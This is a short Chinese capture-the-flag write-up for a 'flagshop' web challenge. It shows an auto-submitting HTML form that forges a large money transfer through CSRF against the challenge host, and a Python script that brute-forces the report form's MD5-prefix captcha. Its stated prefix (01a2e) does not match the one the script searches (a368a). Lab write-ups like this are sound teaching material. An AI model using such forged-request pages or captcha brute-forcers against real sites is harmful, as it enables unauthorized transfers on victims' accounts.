# [极客大挑战 2020]Roamphp6-flagshop

1. 注册账号并登陆

2. 发现可以购买Flag，但是余额不足
3. 发现存在转账功能
4. 发现可以提交报告，并且提示管理员会查看
5. 猜测可能存在CSRF
6. BP抓包转账数据，生成POC

![image-20211005111415980](https://i.loli.net/2021/10/05/dP2wOaiLnHrNj78.png)

添加js自动提交：

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://78fbbb19-2784-48e4-be35-5f8228f1dd85.node4.buuoj.cn:81/transfer.php" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="target" value="truda" />
      <input type="hidden" name="money" value="100000000000" />
      <input type="hidden" name="messages" value="6666" />
      <input type="submit" value="Submit request" />
    </form>
  <script language=javascript>
  setTimeout("document.forms[0].submit()",1000)
  </script>
 </body>
</html>
```



7. 把POC部署到服务器上
8. 提交报告验证码计算

```js
md5($code)[0:5] == 01a2e
```

自动计算：

```python
# -*- coding: UTF-8 -*-
import hashlib

def getMd5(index):
	for i in range(100000, 100000000):
		x = i
		md5 = hashlib.md5(str(x).encode("utf8")).hexdigest()
		if md5[0:5] == index:
			return x
print(getMd5("a368a"))
```

9. 报告内容填POC地址

